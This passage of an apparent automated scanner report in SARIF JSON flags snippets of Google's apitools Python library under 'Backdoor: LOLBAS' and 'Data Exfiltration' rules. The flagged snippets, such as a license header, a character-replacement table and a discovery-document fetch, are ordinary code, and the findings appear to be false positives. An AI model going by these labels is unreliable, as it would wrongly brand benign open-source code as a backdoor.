            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client_lib.py"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 35,
                  "endLine": 48,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        'id': 'StandardQueryParameters',\n        'type': 'object',\n        'description': 'Query parameters accepted by all methods.',\n        'properties': discovery_doc.get('parameters', {}),\n    }\n    # We add an entry for the trace, since Discovery doesn't.\n    standard_query_schema['properties']['trace'] = {\n",
                    "rendered": {
                      "text": "        'id': 'StandardQueryParameters',\n        'type': 'object',\n        'description': 'Query parameters accepted by all methods.',\n        'properties': discovery_doc.get('parameters', {}),\n    }\n    # We add an entry for the trace, since Discovery doesn't.\n    standard_query_schema['properties']['trace'] = {\n",
                      "markdown": "`        'id': 'StandardQueryParameters',\n        'type': 'object',\n        'description': 'Query parameters accepted by all methods.',\n        'properties': discovery_doc.get('parameters', {}),\n    }\n    # We add an entry for the trace, since Discovery doesn't.\n    standard_query_schema['properties']['trace'] = {\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 435,
                  "startColumn": 41,
                  "endLine": 435,
                  "endColumn": 45,
                  "snippet": {
                    "text": "                last_exception = e\n    if discovery_doc is None:\n        raise CommunicationError(\n            'Could not find discovery doc at any of %s: %s' % (\n                discovery_urls, last_exception))\n",
                    "rendered": {
                      "text": "                last_exception = e\n    if discovery_doc is None:\n        raise CommunicationError(\n            'Could not find discovery doc at any of %s: %s' % (\n                discovery_urls, last_exception))\n",
                      "markdown": "`                last_exception = e\n    if discovery_doc is None:\n        raise CommunicationError(\n            'Could not find discovery doc at any of %s: %s' % (\n                discovery_urls, last_exception))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 416,
                  "startColumn": 35,
                  "endLine": 416,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n\ndef FetchDiscoveryDoc(discovery_url, retries=5):\n    \"\"\"Fetch the discovery document at the given url.\"\"\"\n    discovery_urls = _NormalizeDiscoveryUrls(discovery_url)\n    discovery_doc = None\n    last_exception = None\n",
                    "rendered": {
                      "text": "\n\ndef FetchDiscoveryDoc(discovery_url, retries=5):\n    \"\"\"Fetch the discovery document at the given url.\"\"\"\n    discovery_urls = _NormalizeDiscoveryUrls(discovery_url)\n    discovery_doc = None\n    last_exception = None\n",
                      "markdown": "`\n\ndef FetchDiscoveryDoc(discovery_url, retries=5):\n    \"\"\"Fetch the discovery document at the given url.\"\"\"\n    discovery_urls = _NormalizeDiscoveryUrls(discovery_url)\n    discovery_doc = None\n    last_exception = None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 435,
                  "startColumn": 22,
                  "endLine": 435,
                  "endColumn": 28,
                  "snippet": {
                    "text": "                last_exception = e\n    if discovery_doc is None:\n        raise CommunicationError(\n            'Could not find discovery doc at any of %s: %s' % (\n                discovery_urls, last_exception))\n",
                    "rendered": {
                      "text": "                last_exception = e\n    if discovery_doc is None:\n        raise CommunicationError(\n            'Could not find discovery doc at any of %s: %s' % (\n                discovery_urls, last_exception))\n",
                      "markdown": "`                last_exception = e\n    if discovery_doc is None:\n        raise CommunicationError(\n            'Could not find discovery doc at any of %s: %s' % (\n                discovery_urls, last_exception))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 292,
                  "startColumn": 32,
                  "endLine": 293,
                  "snippet": {
                    "text": "        '\\u201c': '\"',  # LEFT DOUBLE QUOTATION MARK\n        '\\u201d': '\"',  # RIGHT DOUBLE QUOTATION MARK\n        '\\u2026': '...',  # HORIZONTAL ELLIPSIS\n        '\\u2e3a': '-',  # TWO-EM DASH\n    }\n\n    def _ReplaceOne(c):\n        \"\"\"Returns the homoglyph or escaped replacement for c.\"\"\"\n",
                    "rendered": {
                      "text": "        '\\u201c': '\"',  # LEFT DOUBLE QUOTATION MARK\n        '\\u201d': '\"',  # RIGHT DOUBLE QUOTATION MARK\n        '\\u2026': '...',  # HORIZONTAL ELLIPSIS\n        '\\u2e3a': '-',  # TWO-EM DASH\n    }\n\n    def _ReplaceOne(c):\n        \"\"\"Returns the homoglyph or escaped replacement for c.\"\"\"\n",
                      "markdown": "`        '\\u201c': '\"',  # LEFT DOUBLE QUOTATION MARK\n        '\\u201d': '\"',  # RIGHT DOUBLE QUOTATION MARK\n        '\\u2026': '...',  # HORIZONTAL ELLIPSIS\n        '\\u2e3a': '-',  # TWO-EM DASH\n    }\n\n    def _ReplaceOne(c):\n        \"\"\"Returns the homoglyph or escaped replacement for c.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 286,
                  "startColumn": 28,
                  "endLine": 287,
                  "snippet": {
                    "text": "        '\\u00a0': ' ',  # &nbsp; ?\n        '\\u00a9': '(C)',  # COPYRIGHT SIGN (would you believe \"asciiglyph\"?)\n        '\\u00ae': '(R)',  # REGISTERED SIGN (would you believe \"asciiglyph\"?)\n        '\\u2014': '-',  # EM DASH\n        '\\u2018': \"'\",  # LEFT SINGLE QUOTATION MARK\n        '\\u2019': \"'\",  # RIGHT SINGLE QUOTATION MARK\n        '\\u201c': '\"',  # LEFT DOUBLE QUOTATION MARK\n        '\\u201d': '\"',  # RIGHT DOUBLE QUOTATION MARK\n",
                    "rendered": {
                      "text": "        '\\u00a0': ' ',  # &nbsp; ?\n        '\\u00a9': '(C)',  # COPYRIGHT SIGN (would you believe \"asciiglyph\"?)\n        '\\u00ae': '(R)',  # REGISTERED SIGN (would you believe \"asciiglyph\"?)\n        '\\u2014': '-',  # EM DASH\n        '\\u2018': \"'\",  # LEFT SINGLE QUOTATION MARK\n        '\\u2019': \"'\",  # RIGHT SINGLE QUOTATION MARK\n        '\\u201c': '\"',  # LEFT DOUBLE QUOTATION MARK\n        '\\u201d': '\"',  # RIGHT DOUBLE QUOTATION MARK\n",
                      "markdown": "`        '\\u00a0': ' ',  # &nbsp; ?\n        '\\u00a9': '(C)',  # COPYRIGHT SIGN (would you believe \"asciiglyph\"?)\n        '\\u00ae': '(R)',  # REGISTERED SIGN (would you believe \"asciiglyph\"?)\n        '\\u2014': '-',  # EM DASH\n        '\\u2018': \"'\",  # LEFT SINGLE QUOTATION MARK\n        '\\u2019': \"'\",  # RIGHT SINGLE QUOTATION MARK\n        '\\u201c': '\"',  # LEFT DOUBLE QUOTATION MARK\n        '\\u201d': '\"',  # RIGHT DOUBLE QUOTATION MARK\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 189,
                  "startColumn": 41,
                  "endLine": 189,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    Returns:\n      base url: string, base url of the service,\n        'https://www.googleapis.com/storage/v1/' for the storage service.\n      base path: string, common prefix of service endpoints after the base url.\n    \"\"\"\n    full_path = urllib_parse.urljoin(root_url, service_path)\n    api_path_component = '/'.join((package, version, ''))\n",
                    "rendered": {
                      "text": "    Returns:\n      base url: string, base url of the service,\n        'https://www.googleapis.com/storage/v1/' for the storage service.\n      base path: string, common prefix of service endpoints after the base url.\n    \"\"\"\n    full_path = urllib_parse.urljoin(root_url, service_path)\n    api_path_component = '/'.join((package, version, ''))\n",
                      "markdown": "`    Returns:\n      base url: string, base url of the service,\n        'https://www.googleapis.com/storage/v1/' for the storage service.\n      base path: string, common prefix of service endpoints after the base url.\n    \"\"\"\n    full_path = urllib_parse.urljoin(root_url, service_path)\n    api_path_component = '/'.join((package, version, ''))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 184,
                  "startColumn": 31,
                  "endLine": 184,
                  "endColumn": 40,
                  "snippet": {
                    "text": "      package: name field of the discovery, i.e. 'storage' for storage service.\n      version: version of the service, i.e. 'v1'.\n      root_url: root url of the service, i.e. 'https://www.googleapis.com/'.\n      service_path: path of the service under the rool url, i.e. 'storage/v1/'.\n\n    Returns:\n      base url: string, base url of the service,\n",
                    "rendered": {
                      "text": "      package: name field of the discovery, i.e. 'storage' for storage service.\n      version: version of the service, i.e. 'v1'.\n      root_url: root url of the service, i.e. 'https://www.googleapis.com/'.\n      service_path: path of the service under the rool url, i.e. 'storage/v1/'.\n\n    Returns:\n      base url: string, base url of the service,\n",
                      "markdown": "`      package: name field of the discovery, i.e. 'storage' for storage service.\n      version: version of the service, i.e. 'v1'.\n      root_url: root url of the service, i.e. 'https://www.googleapis.com/'.\n      service_path: path of the service under the rool url, i.e. 'storage/v1/'.\n\n    Returns:\n      base url: string, base url of the service,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 33,
                  "endLine": 161,
                  "endColumn": 39,
                  "snippet": {
                    "text": "def Chdir(dirname, create=True):\n    if not os.path.exists(dirname):\n        if not create:\n            raise OSError('Cannot find directory %s' % dirname)\n        else:\n            os.mkdir(dirname)\n    previous_directory = os.getcwd()\n",
                    "rendered": {
                      "text": "def Chdir(dirname, create=True):\n    if not os.path.exists(dirname):\n        if not create:\n            raise OSError('Cannot find directory %s' % dirname)\n        else:\n            os.mkdir(dirname)\n    previous_directory = os.getcwd()\n",
                      "markdown": "`def Chdir(dirname, create=True):\n    if not os.path.exists(dirname):\n        if not create:\n            raise OSError('Cannot find directory %s' % dirname)\n        else:\n            os.mkdir(dirname)\n    previous_directory = os.getcwd()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 16,
                  "endLine": 147,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    def FieldName(self, name):\n        \"\"\"Generate a valid field name from name.\"\"\"\n        # TODO(craigcitro): We shouldn't need to strip this name, but some\n        # of the service names here are excessive. Fix the API and then\n        # remove this.\n        name = self.__StripName(name)\n        if self.__name_convention == 'LOWER_CAMEL':\n",
                    "rendered": {
                      "text": "    def FieldName(self, name):\n        \"\"\"Generate a valid field name from name.\"\"\"\n        # TODO(craigcitro): We shouldn't need to strip this name, but some\n        # of the service names here are excessive. Fix the API and then\n        # remove this.\n        name = self.__StripName(name)\n        if self.__name_convention == 'LOWER_CAMEL':\n",
                      "markdown": "`    def FieldName(self, name):\n        \"\"\"Generate a valid field name from name.\"\"\"\n        # TODO(craigcitro): We shouldn't need to strip this name, but some\n        # of the service names here are excessive. Fix the API and then\n        # remove this.\n        name = self.__StripName(name)\n        if self.__name_convention == 'LOWER_CAMEL':\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 407,
                  "startColumn": 30,
                  "endLine": 407,
                  "endColumn": 35,
                  "snippet": {
                    "text": "def _GetURLContent(url):\n    \"\"\"Download and return the content of URL.\"\"\"\n    response = urllib_request.urlopen(url)\n    encoding = response.info().get('Content-Encoding')\n    if encoding == 'gzip':\n        content = _Gunzip(response.read())\n    else:\n",
                    "rendered": {
                      "text": "def _GetURLContent(url):\n    \"\"\"Download and return the content of URL.\"\"\"\n    response = urllib_request.urlopen(url)\n    encoding = response.info().get('Content-Encoding')\n    if encoding == 'gzip':\n        content = _Gunzip(response.read())\n    else:\n",
                      "markdown": "`def _GetURLContent(url):\n    \"\"\"Download and return the content of URL.\"\"\"\n    response = urllib_request.urlopen(url)\n    encoding = response.info().get('Content-Encoding')\n    if encoding == 'gzip':\n        content = _Gunzip(response.read())\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 297,
                  "startColumn": 26,
                  "endLine": 297,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n    def _ReplaceOne(c):\n        \"\"\"Returns the homoglyph or escaped replacement for c.\"\"\"\n        equiv = homoglyphs.get(c)\n        if equiv is not None:\n            return equiv\n        try:\n",
                    "rendered": {
                      "text": "\n    def _ReplaceOne(c):\n        \"\"\"Returns the homoglyph or escaped replacement for c.\"\"\"\n        equiv = homoglyphs.get(c)\n        if equiv is not None:\n            return equiv\n        try:\n",
                      "markdown": "`\n    def _ReplaceOne(c):\n        \"\"\"Returns the homoglyph or escaped replacement for c.\"\"\"\n        equiv = homoglyphs.get(c)\n        if equiv is not None:\n            return equiv\n        try:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 219,
                  "startColumn": 37,
                  "endLine": 219,
                  "endColumn": 42,
                  "snippet": {
                    "text": "                                            discovery_doc['rootUrl'],\n                                            discovery_doc['servicePath'])\n\n        mtls_root_url = discovery_doc.get('mtlsRootUrl', '')\n        mtls_base_url = ''\n        if mtls_root_url:\n            mtls_base_url, _ = _ComputePaths(package, url_version,\n",
                    "rendered": {
                      "text": "                                            discovery_doc['rootUrl'],\n                                            discovery_doc['servicePath'])\n\n        mtls_root_url = discovery_doc.get('mtlsRootUrl', '')\n        mtls_base_url = ''\n        if mtls_root_url:\n            mtls_base_url, _ = _ComputePaths(package, url_version,\n",
                      "markdown": "`                                            discovery_doc['rootUrl'],\n                                            discovery_doc['servicePath'])\n\n        mtls_root_url = discovery_doc.get('mtlsRootUrl', '')\n        mtls_base_url = ''\n        if mtls_root_url:\n            mtls_base_url, _ = _ComputePaths(package, url_version,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 211,
                  "startColumn": 59,
                  "endLine": 211,
                  "endColumn": 64,
                  "snippet": {
                    "text": "               scope_ls, client_id, client_secret, user_agent, names, api_key):\n        \"\"\"Create a new ClientInfo object from a discovery document.\"\"\"\n        scopes = set(\n            discovery_doc.get('auth', {}).get('oauth2', {}).get('scopes', {}))\n        scopes.update(scope_ls)\n        package = discovery_doc['name']\n        url_version = discovery_doc['version']\n",
                    "rendered": {
                      "text": "               scope_ls, client_id, client_secret, user_agent, names, api_key):\n        \"\"\"Create a new ClientInfo object from a discovery document.\"\"\"\n        scopes = set(\n            discovery_doc.get('auth', {}).get('oauth2', {}).get('scopes', {}))\n        scopes.update(scope_ls)\n        package = discovery_doc['name']\n        url_version = discovery_doc['version']\n",
                      "markdown": "`               scope_ls, client_id, client_secret, user_agent, names, api_key):\n        \"\"\"Create a new ClientInfo object from a discovery document.\"\"\"\n        scopes = set(\n            discovery_doc.get('auth', {}).get('oauth2', {}).get('scopes', {}))\n        scopes.update(scope_ls)\n        package = discovery_doc['name']\n        url_version = discovery_doc['version']\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 211,
                  "startColumn": 41,
                  "endLine": 211,
                  "endColumn": 46,
                  "snippet": {
                    "text": "               scope_ls, client_id, client_secret, user_agent, names, api_key):\n        \"\"\"Create a new ClientInfo object from a discovery document.\"\"\"\n        scopes = set(\n            discovery_doc.get('auth', {}).get('oauth2', {}).get('scopes', {}))\n        scopes.update(scope_ls)\n        package = discovery_doc['name']\n        url_version = discovery_doc['version']\n",
                    "rendered": {
                      "text": "               scope_ls, client_id, client_secret, user_agent, names, api_key):\n        \"\"\"Create a new ClientInfo object from a discovery document.\"\"\"\n        scopes = set(\n            discovery_doc.get('auth', {}).get('oauth2', {}).get('scopes', {}))\n        scopes.update(scope_ls)\n        package = discovery_doc['name']\n        url_version = discovery_doc['version']\n",
                      "markdown": "`               scope_ls, client_id, client_secret, user_agent, names, api_key):\n        \"\"\"Create a new ClientInfo object from a discovery document.\"\"\"\n        scopes = set(\n            discovery_doc.get('auth', {}).get('oauth2', {}).get('scopes', {}))\n        scopes.update(scope_ls)\n        package = discovery_doc['name']\n        url_version = discovery_doc['version']\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util.py"
                },
                "region": {
                  "startLine": 211,
                  "startColumn": 25,
                  "endLine": 211,
                  "endColumn": 30,
                  "snippet": {
                    "text": "               scope_ls, client_id, client_secret, user_agent, names, api_key):\n        \"\"\"Create a new ClientInfo object from a discovery document.\"\"\"\n        scopes = set(\n            discovery_doc.get('auth', {}).get('oauth2', {}).get('scopes', {}))\n        scopes.update(scope_ls)\n        package = discovery_doc['name']\n        url_version = discovery_doc['version']\n",
                    "rendered": {
                      "text": "               scope_ls, client_id, client_secret, user_agent, names, api_key):\n        \"\"\"Create a new ClientInfo object from a discovery document.\"\"\"\n        scopes = set(\n            discovery_doc.get('auth', {}).get('oauth2', {}).get('scopes', {}))\n        scopes.update(scope_ls)\n        package = discovery_doc['name']\n        url_version = discovery_doc['version']\n",
                      "markdown": "`               scope_ls, client_id, client_secret, user_agent, names, api_key):\n        \"\"\"Create a new ClientInfo object from a discovery document.\"\"\"\n        scopes = set(\n            discovery_doc.get('auth', {}).get('oauth2', {}).get('scopes', {}))\n        scopes.update(scope_ls)\n        package = discovery_doc['name']\n        url_version = discovery_doc['version']\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 441,
                  "startColumn": 42,
                  "endLine": 441,
                  "endColumn": 47,
                  "snippet": {
                    "text": "                parent_name = self.__names.ClassName(\n                    items.get('title') or name_hint)\n                entry_type_name = self.__AddEntryType(\n                    entry_name_hint, items.get('items'), parent_name)\n                return TypeInfo(type_name=entry_type_name,\n                                variant=messages.Variant.MESSAGE)\n            return self.__GetTypeInfo(items, entry_name_hint)\n",
                    "rendered": {
                      "text": "                parent_name = self.__names.ClassName(\n                    items.get('title') or name_hint)\n                entry_type_name = self.__AddEntryType(\n                    entry_name_hint, items.get('items'), parent_name)\n                return TypeInfo(type_name=entry_type_name,\n                                variant=messages.Variant.MESSAGE)\n            return self.__GetTypeInfo(items, entry_name_hint)\n",
                      "markdown": "`                parent_name = self.__names.ClassName(\n                    items.get('title') or name_hint)\n                entry_type_name = self.__AddEntryType(\n                    entry_name_hint, items.get('items'), parent_name)\n                return TypeInfo(type_name=entry_type_name,\n                                variant=messages.Variant.MESSAGE)\n            return self.__GetTypeInfo(items, entry_name_hint)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 439,
                  "startColumn": 25,
                  "endLine": 439,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            entry_label = self.__ComputeLabel(items)\n            if entry_label == descriptor.FieldDescriptor.Label.REPEATED:\n                parent_name = self.__names.ClassName(\n                    items.get('title') or name_hint)\n                entry_type_name = self.__AddEntryType(\n                    entry_name_hint, items.get('items'), parent_name)\n                return TypeInfo(type_name=entry_type_name,\n",
                    "rendered": {
                      "text": "            entry_label = self.__ComputeLabel(items)\n            if entry_label == descriptor.FieldDescriptor.Label.REPEATED:\n                parent_name = self.__names.ClassName(\n                    items.get('title') or name_hint)\n                entry_type_name = self.__AddEntryType(\n                    entry_name_hint, items.get('items'), parent_name)\n                return TypeInfo(type_name=entry_type_name,\n",
                      "markdown": "`            entry_label = self.__ComputeLabel(items)\n            if entry_label == descriptor.FieldDescriptor.Label.REPEATED:\n                parent_name = self.__names.ClassName(\n                    items.get('title') or name_hint)\n                entry_type_name = self.__AddEntryType(\n                    entry_name_hint, items.get('items'), parent_name)\n                return TypeInfo(type_name=entry_type_name,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 435,
                  "startColumn": 21,
                  "endLine": 435,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            if not items:\n                raise ValueError('Array type with no item type: %s' % attrs)\n            entry_name_hint = self.__names.ClassName(\n                items.get('title') or '%sListEntry' % name_hint)\n            entry_label = self.__ComputeLabel(items)\n            if entry_label == descriptor.FieldDescriptor.Label.REPEATED:\n                parent_name = self.__names.ClassName(\n",
                    "rendered": {
                      "text": "            if not items:\n                raise ValueError('Array type with no item type: %s' % attrs)\n            entry_name_hint = self.__names.ClassName(\n                items.get('title') or '%sListEntry' % name_hint)\n            entry_label = self.__ComputeLabel(items)\n            if entry_label == descriptor.FieldDescriptor.Label.REPEATED:\n                parent_name = self.__names.ClassName(\n",
